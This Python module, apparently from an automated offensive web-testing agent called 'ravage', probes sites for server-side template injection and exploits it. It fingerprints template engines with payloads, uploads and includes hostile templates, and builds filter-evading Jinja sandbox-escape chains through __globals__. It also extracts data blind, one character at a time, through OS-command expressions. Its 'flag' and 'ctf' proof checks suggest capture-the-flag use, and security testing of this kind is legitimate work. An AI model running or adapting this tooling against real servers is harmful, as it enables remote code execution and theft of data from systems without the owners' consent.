from __future__ import annotations

import json
import re
import secrets
from typing import Callable, TypeVar
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

from ravage.agent_core.agent_state import AgentState
from ravage.runtime.common import clip
from ravage.probes.specialists.shared import (
    _auth_headers_from_state,
    _baseline_value,
    _common_param_names,
    _dedupe,
    _form_priority,
    _form_targets,
    _generic_input_targets,
    _input_name_priority,
    _int_value,
    _list_of_dicts,
    _name_looks_expression_context,
    _send_target,
    _slow_response,
    _string_items,
    _surface_endpoints,
    _target_brief,
    _target_current_value,
    _target_headers,
    _target_replay,
)
from ravage.web_core.http_probe import (
    ProbeResponse,
    ProbeSession,
    compare_responses,
    form_defaults,
    inject_query_param,
)
from ravage.web_core.proof_recognizer import recognize_proofs

_ResultT = TypeVar("_ResultT")

_SSTI_REQUEST_BUDGET = 18

_SSTI_EXTRACTION_REQUEST_BUDGET = 96

_SSTI_INCLUDE_REQUEST_BUDGET = 36

_SSTI_EXPRESSION_REQUEST_BUDGET = 760

_SSTI_STORED_BUDGET = 28

_STORABLE_INPUT_MARKERS = (
    "name",
    "title",
    "comment",
    "message",
    "bio",
    "about",
    "description",
    "note",
    "content",
    "body",
    "subject",
    "feedback",
    "display",
    "nick",
    "user",
    "author",
    "text",
    "post",
    "review",
)

_SSTI_RENDER_PATHS = (
    "/",
    "/profile",
    "/account",
    "/me",
    "/home",
    "/dashboard",
    "/comments",
    "/posts",
    "/messages",
    "/notes",
    "/feedback",
    "/guestbook",
    "/items",
    "/reviews",
)


def probe_ssti_fingerprint(
    session: ProbeSession,
    state: AgentState,
    result_cls: Callable[..., _ResultT],
    *,
    probe_name: str,
) -> _ResultT:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    budget = _SSTI_REQUEST_BUDGET
    targets = _generic_input_targets(state, limit=12)
    slow_target = False
    expression_attempted = False

    if _has_deferred_registration_ssti_surface(state):
        workflow, workflow_requests, _ = _try_deferred_registration_ssti_workflow(session, state)
        requests.extend(workflow_requests)
        if workflow:
            findings.append(workflow)
            return result_cls(
                ok=True,
                probe=probe_name,
                summary=(
                    "deferred registration workflow exposed SSTI proof; "
                    f"requests={len(requests)}, findings={len(findings)}"
                ),
                findings=findings[:30],
                requests=requests[:90],
            )

    if _should_prioritize_ssti_expression_context(state, targets):
        expression_attempted = True
        expression, expression_requests, _ = _try_ssti_expression_context(
            session,
            state,
            targets,
            budget=_SSTI_EXPRESSION_REQUEST_BUDGET,
        )
        requests.extend(expression_requests)
        if expression:
            findings.append(expression)

    for target in _targets_to_probe_after_expression(findings, targets):
        if budget <= 0 or len(findings) >= 3:
            break
        baseline_value = _baseline_value(str(target.get("input") or ""))
        baseline = _send_target(session, target, baseline_value)
        budget -= 1
        requests.append(
            baseline.summary(body_chars=120)
            | {"target": _target_brief(target), "probe_kind": "baseline"}
        )
        if baseline.status is not None and baseline.status in {401, 403, 404, 405}:
            continue
        if baseline.status is not None and baseline.status >= 500:
            continue
        missing = _missing_required_params(baseline, exclude=str(target.get("input") or ""))
        if missing and budget > 0:
            target = _augment_target_with_params(target, missing)
            baseline = _send_target(session, target, baseline_value)
            budget -= 1
            requests.append(
                baseline.summary(body_chars=120)
                | {
                    "target": _target_brief(target),
                    "probe_kind": "baseline_supplemented",
                    "supplied": missing,
                }
            )
            if baseline.status is not None and baseline.status in {401, 403, 404, 405}:
                continue
            if baseline.status is not None and baseline.status >= 500:
                continue
        slow_target = _slow_response(baseline)
        cases = _ssti_fingerprint_cases_for_response(baseline)
        for case in cases:
            if budget <= 0:
                break
            response = _send_target(session, target, str(case["payload"]))
            budget -= 1
            delta = compare_responses(baseline, response, marker=str(case["payload"]))
            requests.append(
                response.summary(body_chars=220)
                | {
                    "target": _target_brief(target),
                    "probe_kind": "ssti_fingerprint",
                    "payload": case["payload"],
                    "engine_candidates": case["engines"],
                    "delta": delta.to_json(),
                }
            )
            signal = _ssti_signal(response, baseline=baseline, case=case)
            if signal:
                finding = {
                    "type": "ssti_fingerprint_signal",
                    "input": _target_brief(target),
                    "payload": case["payload"],
                    "expected": case["expected"],
                    "engine_candidates": case["engines"],
                    "signal": signal,
                    "delta": delta.to_json(),
                    "response": response.summary(body_chars=360),
                    "baseline_replay": _target_replay(target, baseline_value),
                    "replay": _target_replay(target, str(case["payload"])),
                    "next": "Keep payloads engine-specific and bounded; escalate only after harmless evaluation is proven.",
                }
                engines = _ssti_engines_for_signal(case, signal, response.body)
                extraction_budget = _extraction_budget_for_target(slow_target)
                extraction, extraction_requests, _ = _try_ssti_extraction(
                    session,
                    target,
                    engines=engines,
                    budget=extraction_budget,
                    max_payloads=extraction_budget,
                )
                requests.extend(extraction_requests)
                findings.append(extraction or finding)
                break
        if _has_extracted_ssti_proof(findings):
            break
        if slow_target and not findings:
            break
    if not findings and not slow_target:
        include, include_requests, _ = _try_ssti_upload_include(
            session,
            state,
            targets,
            budget=_SSTI_INCLUDE_REQUEST_BUDGET,
        )
        requests.extend(include_requests)
        if include:
            findings.append(include)
    if not findings and not slow_target and not expression_attempted:
        expression, expression_requests, _ = _try_ssti_expression_context(
            session,
            state,
            targets,
            budget=_SSTI_EXPRESSION_REQUEST_BUDGET,
        )
        requests.extend(expression_requests)
        if expression:
            findings.append(expression)
    if not findings and not slow_target:
        stored, stored_requests, _ = _try_stored_ssti(
            session, state, targets, budget=_SSTI_STORED_BUDGET
        )
        requests.extend(stored_requests)
        if stored:
            findings.append(stored)
    return result_cls(
        ok=bool(findings),
        probe=probe_name,
        summary=(
            f"tested {len(targets)} input target(s), "
            f"requests={len(requests)}, findings={len(findings)}"
        ),
        findings=findings[:30],
        requests=requests[:90],
    )


def _has_deferred_registration_ssti_surface(state: AgentState) -> bool:
    forms = _form_targets(state, limit=8)
    if not forms:
        return False
    text = " ".join(
        (
            json.dumps(forms, sort_keys=True),
            json.dumps(state.surface.get("technologies", []), sort_keys=True),
            " ".join(_string_items(state.signals.get("markers"))),
            " ".join(_string_items(state.signals.get("endpoints"))),
        )
    ).lower()
    if not _contains_any(text, ("register", "signup", "sign-up", "step", "wizard")):
        return False
    if _contains_any(text, ("template", "django", "jinja", "ssti", "{{", "render")):
        return True
    for form in forms:
        form_text = json.dumps(form, sort_keys=True).lower()
        if _contains_any(form_text, ("name", "display", "username")) and _contains_any(form_text, ("password", "email")):
            return True
    return False


def _try_deferred_registration_ssti_workflow(
    session: ProbeSession,
    state: AgentState,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    from ravage.deterministic_agents.auth_session import probe_auth_session

    result = probe_auth_session(session, state)
    requests = [
        request | {"probe_kind": f"ssti_{request.get('probe_kind', 'deferred_registration_workflow')}"}
        for request in result.requests
    ]
    for finding in result.findings:
        proofs = _proofs_from_auth_finding(finding)
        if proofs:
            return (
                {
                    "type": "ssti_extracted_proof",
                    "channel": "deferred_registration_workflow",
                    "proofs": proofs,
                    "proof": proofs[0],
                    "source_finding": _deferred_auth_finding_brief(finding),
                    "next": (
                        "A multi-step registration flow rendered a submitted template "
                        "context payload; replay the same steps with the proof payload."
                    ),
                },
                requests,
                0,
            )
    for finding in result.findings:
        if finding.get("type") == "deferred_form_flow_signal":
            return (
                {
                    "type": "ssti_stored_signal",
                    "channel": "deferred_registration_workflow",
                    "source_finding": _deferred_auth_finding_brief(finding),
                    "next": (
                        "The registration wizard evaluated a submitted template expression. "
                        "Use context-variable payloads such as {{ flag }} in the same first-step field."
                    ),
                },
                requests,
                0,
            )
    return None, requests, 0


def _proofs_from_auth_finding(finding: dict[str, object]) -> list[str]:
    proofs = _string_items(finding.get("proofs"))
    proof = str(finding.get("proof") or "")
    if proof:
        proofs.append(proof)
    return _dedupe(proofs)


def _deferred_auth_finding_brief(finding: dict[str, object]) -> dict[str, object]:
    brief: dict[str, object] = {
        "type": finding.get("type"),
        "channel": finding.get("channel"),
    }
    for key in ("detail", "payload", "form", "signal"):
        if key in finding:
            brief[key] = finding[key]
    return brief


def _contains_any(text: str, needles: tuple[str, ...]) -> bool:
    for needle in needles:
        if needle in text:
            return True
    return False


def _targets_to_probe_after_expression(
    findings: list[dict[str, object]],
    targets: list[dict[str, object]],
) -> list[dict[str, object]]:
    if findings:
        return []
    return targets


def _extraction_budget_for_target(slow_target: bool) -> int:
    if slow_target:
        return 4
    return _SSTI_EXTRACTION_REQUEST_BUDGET


def _has_extracted_ssti_proof(findings: list[dict[str, object]]) -> bool:
    return any(
        finding.get("type") == "ssti_extracted_proof" and bool(finding.get("proofs"))
        for finding in findings
    )


def _ssti_fingerprint_cases() -> list[dict[str, object]]:
    return [
        {"payload": '{{ 7|add:"42" }}', "expected": ["49"], "engines": ["django"]},
        {
            "payload": "{{7*7}}",
            "expected": ["49"],
            "engines": ["jinja2", "twig", "nunjucks", "smarty"],
        },
        {"payload": "{% print 7*7 %}", "expected": ["49"], "engines": ["jinja2"]},
        {"payload": "{% if 7*7 == 49 %}49{% endif %}", "expected": ["49"], "engines": ["jinja2"]},
        {"payload": "{{7*'7'}}", "expected": ["7777777"], "engines": ["jinja2", "tornado"]},
        {"payload": "{{'ravage'|upper}}", "expected": ["RAVAGE"], "engines": ["django", "jinja2"]},
        {"payload": "{{'ravage'.upper()}}", "expected": ["RAVAGE"], "engines": ["jinja2"]},
        {"payload": "{7*7}", "expected": ["49"], "engines": ["smarty"]},
        {
            "payload": "{{1==1}}",
            "expected": ["True", "true", "1"],
            "engines": ["jinja2", "twig", "nunjucks"],
        },
        {"payload": "${7*7}", "expected": ["49"], "engines": ["freemarker", "mako", "groovy"]},
        {"payload": "#{7*7}", "expected": ["49"], "engines": ["velocity", "ruby"]},
        {"payload": "<%= 7*7 %>", "expected": ["49"], "engines": ["erb", "ejs"]},
        {"payload": "[[${7*7}]]", "expected": ["49"], "engines": ["thymeleaf"]},
        {"payload": "*{7*7}", "expected": ["49"], "engines": ["thymeleaf"]},
    ]


def _ssti_jinja_tag_fingerprint_cases() -> list[dict[str, object]]:
    return [
        {"payload": "{% print 7*7 %}", "expected": ["49"], "engines": ["jinja2"]},
        {"payload": "{% if 7*7 == 49 %}49{% endif %}", "expected": ["49"], "engines": ["jinja2"]},
        {"payload": "{% print 6*7 %}", "expected": ["42"], "engines": ["jinja2"]},
        {"payload": "{% if 6*7 == 42 %}42{% endif %}", "expected": ["42"], "engines": ["jinja2"]},
    ]


def _ssti_fingerprint_cases_for_response(response: ProbeResponse) -> list[dict[str, object]]:
    cases = _ssti_fingerprint_cases()
    if _slow_response(response):
        return cases[:2]
    return cases


def _try_ssti_extraction(
    session: ProbeSession,
    target: dict[str, object],
    *,
    engines: list[str],
    budget: int,
    max_payloads: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    for payload in _ssti_extraction_payloads(engines)[:max_payloads]:
        if budget <= 0:
            break
        response = _send_target(session, target, payload)
        budget -= 1
        requests.append(
            response.summary(body_chars=500)
            | {
                "target": _target_brief(target),
                "probe_kind": "ssti_extract",
                "payload": payload,
            }
        )
        proofs = recognize_proofs(response.body)
        if proofs:
            return (
                {
                    "type": "ssti_extracted_proof",
                    "input": _target_brief(target),
                    "engine_candidates": engines,
                    "payload": payload,
                    "proofs": proofs,
                    "response": response.summary(body_chars=900),
                    "replay": _target_replay(target, payload),
                },
                requests,
                budget,
            )
        execution_signal = _ssti_execution_signal(response.body)
        if execution_signal:
            return (
                {
                    "type": "ssti_engine_execution",
                    "input": _target_brief(target),
                    "engine_candidates": engines,
                    "payload": payload,
                    "signal": execution_signal,
                    "response": response.summary(body_chars=700),
                    "replay": _target_replay(target, payload),
                    "next": "Use this confirmed execution template for a narrower proof read.",
                },
                requests,
                budget,
            )
    engine_text = " ".join(engines)
    if any(engine in engine_text for engine in ("jinja2", "nunjucks")) and budget > 0:
        extraction, extraction_requests, budget = _try_filtered_jinja_numeric_extract(
            session,
            target,
            budget=budget,
        )
        requests.extend(extraction_requests)
        if extraction:
            return extraction, requests, budget
    return None, requests, budget


def _try_ssti_upload_include(
    session: ProbeSession,
    state: AgentState,
    targets: list[dict[str, object]],
    *,
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    upload_forms = _ssti_upload_forms(state)
    include_targets = _ssti_include_targets(state, targets)
    if not upload_forms or not include_targets:
        return None, requests, budget
    for form in upload_forms[:3]:
        file_field = _first_form_file_input_name(form)
        if not file_field:
            continue
        for case in _jinja_upload_include_cases():
            finding, case_requests, budget = _try_ssti_upload_include_case(
                session,
                form,
                file_field=file_field,
                include_targets=include_targets,
                case=case,
                budget=budget,
            )
            requests.extend(case_requests)
            if finding is not None or budget <= 0:
                return finding, requests, budget
    return None, requests, budget


def _first_form_file_input_name(form: dict[str, object]) -> str:
    file_fields = _form_file_input_names(form)
    if not file_fields:
        return ""
    return file_fields[0]


def _jinja_upload_include_cases() -> list[dict[str, object]]:
    cases: list[dict[str, object]] = []
    for case in _ssti_fingerprint_cases():
        engines = _string_items(case.get("engines"))
        if "jinja2" in engines:
            cases.append(case)
    return cases[:2]


def _try_ssti_upload_include_case(
    session: ProbeSession,
    form: dict[str, object],
    *,
    file_field: str,
    include_targets: list[dict[str, object]],
    case: dict[str, object],
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    if budget <= 0:
        return None, requests, budget

    filename = f"ravage_template_{secrets.token_hex(4)}.html"
    payload = str(case["payload"])
    upload = _submit_ssti_template_upload(
        session,
        form,
        file_field=file_field,
        filename=filename,
        body=payload.encode("utf-8"),
    )
    budget -= 1
    requests.append(_ssti_template_upload_request(upload, form, file_field, filename, payload))

    proofs = recognize_proofs(upload.body)
    if proofs:
        return (
            _ssti_include_finding(form, file_field, filename, payload, upload, proofs=proofs),
            requests,
            budget,
        )

    finding, include_requests, budget = _probe_ssti_include_targets_for_upload(
        session,
        form,
        file_field=file_field,
        filename=filename,
        payload=payload,
        include_targets=include_targets,
        case=case,
        budget=budget,
    )
    requests.extend(include_requests)
    return finding, requests, budget


def _ssti_template_upload_request(
    upload: ProbeResponse,
    form: dict[str, object],
    file_field: str,
    filename: str,
    payload: str,
) -> dict[str, object]:
    return upload.summary(body_chars=180) | {
        "probe_kind": "ssti_template_upload",
        "form": _form_brief_for_ssti(form),
        "file_field": file_field,
        "filename": filename,
        "payload": payload,
    }


def _probe_ssti_include_targets_for_upload(
    session: ProbeSession,
    form: dict[str, object],
    *,
    file_field: str,
    filename: str,
    payload: str,
    include_targets: list[dict[str, object]],
    case: dict[str, object],
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    for target in include_targets[:8]:
        for include_value in _ssti_include_values(filename):
            finding, probe_requests, budget = _probe_ssti_include_value(
                session,
                form,
                target,
                file_field=file_field,
                filename=filename,
                payload=payload,
                include_value=include_value,
                case=case,
                budget=budget,
            )
            requests.extend(probe_requests)
            if finding is not None or budget <= 0:
                return finding, requests, budget
    return None, requests, budget


def _probe_ssti_include_value(
    session: ProbeSession,
    form: dict[str, object],
    target: dict[str, object],
    *,
    file_field: str,
    filename: str,
    payload: str,
    include_value: str,
    case: dict[str, object],
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    if budget <= 0:
        return None, requests, budget

    response = _send_target(session, target, include_value)
    budget -= 1
    requests.append(_ssti_template_include_request(response, target, filename, include_value))

    proofs = recognize_proofs(response.body)
    if proofs:
        return (
            _ssti_include_finding(form, file_field, filename, payload, response, proofs=proofs),
            requests,
            budget,
        )

    expected = _string_items(case.get("expected"))
    if not _stored_eval_signal(response.body, "", expected, payload):
        return None, requests, budget

    extraction, extraction_requests, budget = _ssti_upload_include_extraction(
        session,
        form,
        target,
        file_field=file_field,
        include_value=include_value,
        budget=budget,
    )
    requests.extend(extraction_requests)
    if extraction is not None:
        return extraction, requests, budget

    return (
        _ssti_upload_include_signal_finding(
            form,
            target,
            file_field=file_field,
            filename=filename,
            payload=payload,
            expected=expected,
            include_value=include_value,
        ),
        requests,
        budget,
    )


def _ssti_template_include_request(
    response: ProbeResponse,
    target: dict[str, object],
    filename: str,
    include_value: str,
) -> dict[str, object]:
    return response.summary(body_chars=260) | {
        "probe_kind": "ssti_template_include",
        "target": _target_brief(target),
        "filename": filename,
        "include_value": include_value,
    }


def _ssti_upload_include_signal_finding(
    form: dict[str, object],
    target: dict[str, object],
    *,
    file_field: str,
    filename: str,
    payload: str,
    expected: list[str],
    include_value: str,
) -> dict[str, object]:
    return {
        "type": "ssti_stored_signal",
        "channel": "upload_include",
        "form": _form_brief_for_ssti(form),
        "input": _target_brief(target),
        "file_field": file_field,
        "filename": filename,
        "payload": payload,
        "expected": expected,
        "replay": _target_replay(target, include_value),
        "next": (
            "Template upload/include evaluation is confirmed; reuse the upload and "
            "include target for proof extraction."
        ),
    }


def _ssti_upload_include_extraction(
    session: ProbeSession,
    form: dict[str, object],
    target: dict[str, object],
    *,
    file_field: str,
    include_value: str,
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    include_prefix = _include_prefix_from_value(include_value)
    for payload in _jinja_ssti_payloads()[:10]:
        if budget <= 1:
            break
        filename = f"ravage_template_{secrets.token_hex(4)}.html"
        next_include_value = include_prefix + filename
        upload = _submit_ssti_template_upload(
            session,
            form,
            file_field=file_field,
            filename=filename,
            body=payload.encode("utf-8"),
        )
        budget -= 1
        requests.append(
            upload.summary(body_chars=180)
            | {
                "probe_kind": "ssti_template_extract_upload",
                "form": _form_brief_for_ssti(form),
                "file_field": file_field,
                "filename": filename,
                "payload": payload,
            }
        )
        response = _send_target(session, target, next_include_value)
        budget -= 1
        requests.append(
            response.summary(body_chars=500)
            | {
                "probe_kind": "ssti_template_extract_include",
                "target": _target_brief(target),
                "filename": filename,
                "include_value": next_include_value,
                "payload": payload,
            }
        )
        proofs = recognize_proofs(upload.body + "\n" + response.body)
        if proofs:
            return (
                _ssti_include_finding(form, file_field, filename, payload, response, proofs=proofs),
                requests,
                budget,
            )
        execution_signal = _ssti_execution_signal(response.body)
        if execution_signal:
            return (
                {
                    "type": "ssti_engine_execution",
                    "channel": "upload_include",
                    "form": _form_brief_for_ssti(form),
                    "input": _target_brief(target),
                    "file_field": file_field,
                    "filename": filename,
                    "payload": payload,
                    "signal": execution_signal,
                    "response": response.summary(body_chars=700),
                    "replay": _target_replay(target, next_include_value),
                },
                requests,
                budget,
            )
    return None, requests, budget


def _try_ssti_expression_context(
    session: ProbeSession,
    state: AgentState,
    targets: list[dict[str, object]],
    *,
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    for target in _ssti_expression_targets(state, targets)[:16]:
        if budget <= 0:
            break
        baseline = _send_target(session, target, _target_current_value(target) or "2")
        budget -= 1
        baseline_count = _template_repetition_count(baseline.body)
        requests.append(
            baseline.summary(body_chars=160)
            | {
                "probe_kind": "ssti_expression_baseline",
                "target": _target_brief(target),
                "count": baseline_count,
            }
        )
        missing = _missing_required_params(baseline, exclude=str(target.get("input") or ""))
        if missing and budget > 0:
            target = _augment_target_with_params(target, missing)
            baseline = _send_target(session, target, _target_current_value(target) or "2")
            budget -= 1
            baseline_count = _template_repetition_count(baseline.body)
            requests.append(
                baseline.summary(body_chars=160)
                | {
                    "probe_kind": "ssti_expression_baseline_supplemented",
                    "target": _target_brief(target),
                    "count": baseline_count,
                    "supplied": missing,
                }
            )
        signal_payload = ""
        signal_count = 0
        for payload in ("7*7", "6*7", "40+9", "25*2"):
            if budget <= 0:
                break
            response = _send_target(session, target, payload)
            budget -= 1
            count = _template_repetition_count(response.body)
            requests.append(
                response.summary(body_chars=180)
                | {
                    "probe_kind": "ssti_expression_probe",
                    "target": _target_brief(target),
                    "payload": payload,
                    "count": count,
                }
            )
            expected = _safe_int_expression(payload)
            if expected > 0 and count == expected and count != baseline_count:
                signal_payload = payload
                signal_count = count
                break
            if _template_error_markers(response.body):
                signal_payload = payload
                signal_count = count
                break
        signal: dict[str, object] = {}
        engines = ["jinja2"]
        expected = [str(_safe_int_expression(signal_payload))] if signal_payload else []
        if not signal_payload:
            for case in _ssti_jinja_tag_fingerprint_cases():
                if budget <= 0:
                    break
                payload = str(case["payload"])
                response = _send_target(session, target, payload)
                budget -= 1
                count = _template_repetition_count(response.body)
                requests.append(
                    response.summary(body_chars=220)
                    | {
                        "probe_kind": "ssti_expression_tag_probe",
                        "target": _target_brief(target),
                        "payload": payload,
                        "count": count,
                        "engine_candidates": case["engines"],
                    }
                )
                signal = _ssti_signal(response, baseline=baseline, case=case)
                if signal:
                    signal_payload = payload
                    signal_count = count
                    engines = _string_items(case.get("engines"))
                    expected = _string_items(case.get("expected"))
                    break
        if not signal_payload:
            continue
        if signal_payload.startswith("{%"):
            extraction, extraction_requests, budget = _try_ssti_extraction(
                session,
                target,
                engines=engines,
                budget=budget,
                max_payloads=min(budget, _SSTI_EXTRACTION_REQUEST_BUDGET),
            )
            requests.extend(extraction_requests)
        else:
            extraction, extraction_requests, budget = _blind_jinja_expression_extract(
                session,
                target,
                budget=budget,
            )
            requests.extend(extraction_requests)
        return (
            (
                extraction
                or {
                    "type": "ssti_fingerprint_signal",
                    "channel": "expression_context",
                    "input": _target_brief(target),
                    "payload": signal_payload,
                    "expected": expected,
                    "engine_candidates": engines,
                    "signal": signal or {"kind": "expression_repetition", "count": signal_count},
                    "replay": _target_replay(target, signal_payload),
                    "next": "The input is evaluated inside a server-side expression; use syntax-preserving expression payloads and blind oracles.",
                }
            ),
            requests,
            budget,
        )
    return None, requests, budget


def _blind_jinja_expression_extract(
    session: ProbeSession,
    target: dict[str, object],
    *,
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    os_expr = ""
    true_count = 0
    false_count = 0
    for candidate in _jinja_os_expression_candidates():
        if budget <= 1:
            return None, requests, budget

        true_payload = _jinja_blind_payload(candidate, "printf ravage_ssti")
        true_response = _send_target(session, target, true_payload)
        budget -= 1
        candidate_true_count = _template_repetition_count(true_response.body)
        requests.append(
            true_response.summary(body_chars=180)
            | {
                "probe_kind": "ssti_blind_os_candidate_true",
                "target": _target_brief(target),
                "payload": true_payload,
                "count": candidate_true_count,
            }
        )

        false_payload = _jinja_blind_payload(candidate, "true")
        false_response = _send_target(session, target, false_payload)
        budget -= 1
        candidate_false_count = _template_repetition_count(false_response.body)
        requests.append(
            false_response.summary(body_chars=180)
            | {
                "probe_kind": "ssti_blind_os_candidate_false",
                "target": _target_brief(target),
                "payload": false_payload,
                "count": candidate_false_count,
            }
        )
        if (
            candidate_true_count > 0
            and candidate_false_count > 0
            and candidate_true_count != candidate_false_count
        ):
            os_expr = candidate
            true_count = candidate_true_count
            false_count = candidate_false_count
            break
    if not os_expr:
        return None, requests, budget

    direct, direct_requests, budget = _direct_jinja_expression_extract(
        session,
        target,
        os_expr,
        budget=budget,
        true_count=true_count,
        false_count=false_count,
    )
    requests.extend(direct_requests)
    if direct:
        return direct, requests, budget

    extracted = ""
    for index in range(128):
        if budget <= 8:
            break
        exists, exists_requests, budget = _blind_jinja_condition(
            session,
            target,
            _jinja_blind_python_nonempty_payload(os_expr, index),
            budget=budget,
            label="ssti_blind_char_exists",
            true_count=true_count,
        )
        requests.extend(exists_requests)
        if not exists:
            break
        low = 32
        high = 126
        while low < high and budget > 0:
            mid = (low + high) // 2
            greater, compare_requests, budget = _blind_jinja_condition(
                session,
                target,
                _jinja_blind_python_greater_payload(os_expr, index, chr(mid)),
                budget=budget,
                label="ssti_blind_char_compare",
                true_count=true_count,
            )
            requests.extend(compare_requests)
            if greater:
                low = mid + 1
            else:
                high = mid
        if low < 32 or low > 126:
            break
        extracted += chr(low)
        proofs = recognize_proofs(extracted)
        if proofs:
            return (
                {
                    "type": "ssti_extracted_proof",
                    "channel": "blind_expression_context",
                    "input": _target_brief(target),
                    "engine_candidates": ["jinja2"],
                    "payload": _jinja_blind_python_equals_payload(os_expr, index, chr(low)),
                    "proofs": proofs,
                    "extracted": extracted,
                    "oracle": {"true_count": true_count, "false_count": false_count},
                    "replay": _target_replay(
                        target, _jinja_blind_python_equals_payload(os_expr, index, chr(low))
                    ),
                },
                requests,
                budget,
            )
        if extracted.endswith("}") and "{" in extracted:
            break
    if extracted and _filtered_numeric_prefix_is_meaningful(extracted):
        return (
            {
                "type": "ssti_engine_execution",
                "channel": "blind_expression_context",
                "input": _target_brief(target),
                "engine_candidates": ["jinja2"],
                "signal": {"kind": "blind_output_oracle", "extracted_prefix": extracted},
                "oracle": {"true_count": true_count, "false_count": false_count},
                "replay": _target_replay(target, _jinja_blind_python_nonempty_payload(os_expr, 0)),
            },
            requests,
            budget,
        )
    return None, requests, budget


def _direct_jinja_expression_extract(
    session: ProbeSession,
    target: dict[str, object],
    os_expr: str,
    *,
    budget: int,
    true_count: int,
    false_count: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    extracted = ""
    for index in range(128):
        if budget <= 0:
            break
        payload = _jinja_blind_python_ord_payload(os_expr, index)
        response = _send_target(session, target, payload)
        budget -= 1
        count = _template_repetition_count(response.body)
        requests.append(
            response.summary(body_chars=120)
            | {
                "probe_kind": "ssti_blind_char_ord",
                "target": _target_brief(target),
                "count": count,
            }
        )
        if count <= 0:
            break
        if count < 9 or count > 126:
            break
        extracted += chr(count)
        proofs = recognize_proofs(extracted)
        if proofs:
            return (
                {
                    "type": "ssti_extracted_proof",
                    "channel": "blind_expression_context",
                    "input": _target_brief(target),
                    "engine_candidates": ["jinja2"],
                    "payload": payload,
                    "proofs": proofs,
                    "extracted": extracted,
                    "oracle": {
                        "true_count": true_count,
                        "false_count": false_count,
                        "mode": "direct_ord",
                    },
                    "replay": _target_replay(target, payload),
                },
                requests,
                budget,
            )
        if extracted.endswith("}") and "{" in extracted:
            break
    if extracted:
        return (
            {
                "type": "ssti_engine_execution",
                "channel": "blind_expression_context",
                "input": _target_brief(target),
                "engine_candidates": ["jinja2"],
                "signal": {"kind": "blind_output_oracle", "extracted_prefix": extracted},
                "oracle": {
                    "true_count": true_count,
                    "false_count": false_count,
                    "mode": "direct_ord",
                },
                "replay": _target_replay(target, _jinja_blind_python_ord_payload(os_expr, 0)),
            },
            requests,
            budget,
        )
    return None, requests, budget


def _try_filtered_jinja_numeric_extract(
    session: ProbeSession,
    target: dict[str, object],
    *,
    budget: int,
) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
    requests: list[dict[str, object]] = []
    selected_context = ""
    extracted = ""

    for context_expr in _filtered_jinja_global_context_candidates():
        if budget <= 0:
            return None, requests, budget
        payload = _filtered_jinja_numeric_ord_payload(context_expr, 0)
        response = _send_target(session, target, payload)
        budget -= 1
        ordinal = _ssti_numeric_response_value(response.body)
        requests.append(
            response.summary(body_chars=180)
            | {
                "probe_kind": "ssti_filtered_char_ord_candidate",
                "target": _target_brief(target),
                "ordinal": ordinal,
            }
        )
        if ordinal is None or ordinal <= 0:
            continue
        if ordinal < 9 or ordinal > 126:
            continue
        selected_context = context_expr
        extracted = chr(ordinal)
        break

    if not selected_context:
        return None, requests, budget

    proofs = recognize_proofs(extracted)
    if proofs:
        payload = _filtered_jinja_numeric_ord_payload(selected_context, 0)
        return (
            {
                "type": "ssti_extracted_proof",
                "channel": "filtered_numeric_jinja",
                "input": _target_brief(target),
                "engine_candidates": ["jinja2"],
                "payload": payload,
                "proofs": proofs,
                "extracted": extracted,
                "replay": _target_replay(target, payload),
            },
            requests,
            budget,
        )

    last_payload = _filtered_jinja_numeric_ord_payload(selected_context, 0)
    for index in range(1, 160):
        if budget <= 0:
            break
        payload = _filtered_jinja_numeric_ord_payload(selected_context, index)
        response = _send_target(session, target, payload)
        budget -= 1
        ordinal = _ssti_numeric_response_value(response.body)
        requests.append(
            response.summary(body_chars=180)
            | {
                "probe_kind": "ssti_filtered_char_ord",
                "target": _target_brief(target),
                "index": index,
                "ordinal": ordinal,
            }
        )
        if ordinal is None or ordinal <= 0:
            break
        if ordinal < 9 or ordinal > 126:
            break
        last_payload = payload
        extracted += chr(ordinal)
        proofs = recognize_proofs(extracted)
        if proofs:
            return (
                {
                    "type": "ssti_extracted_proof",
                    "channel": "filtered_numeric_jinja",
                    "input": _target_brief(target),
                    "engine_candidates": ["jinja2"],
                    "payload": payload,
                    "proofs": proofs,
                    "extracted": extracted,
                    "replay": _target_replay(target, payload),
                },
                requests,
                budget,
            )
        if extracted.endswith("}") and "{" in extracted:
            break

    if extracted:
        return (
            {
                "type": "ssti_engine_execution",
                "channel": "filtered_numeric_jinja",
                "input": _target_brief(target),
                "engine_candidates": ["jinja2"],
                "signal": {"kind": "numeric_output_oracle", "extracted_prefix": extracted},
                "replay": _target_replay(target, last_payload),
            },
            requests,
            budget,
        )
    return None, requests, budget


def _filtered_numeric_prefix_is_meaningful(extracted: str) -> bool:
    text = extracted.strip()
    if not text:
        return False
    lowered = text.lower()
    if lowered.startswith(("flag", "ctf", "ravage")):
        return True
    if len(text) < 4:
        return False
    sample = text[: min(len(text), 12)]
    if len(set(sample)) <= 2:
        return False
    return bool(re.search(r"[A-Za-z0-9_]{4,}", text))


def _filtered_jinja_global_context_candidates() -> list[str]:
    init_attr = _jinja_filtered_string("__init__")
    globals_attr = _jinja_filtered_string("__globals__")
    return [
        f"cycler|attr({init_attr})|attr({globals_attr})",
        f"joiner|attr({init_attr})|attr({globals_attr})",
        f"namespace|attr({init_attr})|attr({globals_attr})",
        f"lipsum|attr({globals_attr})",
        f"url_for|attr({globals_attr})",
    ]


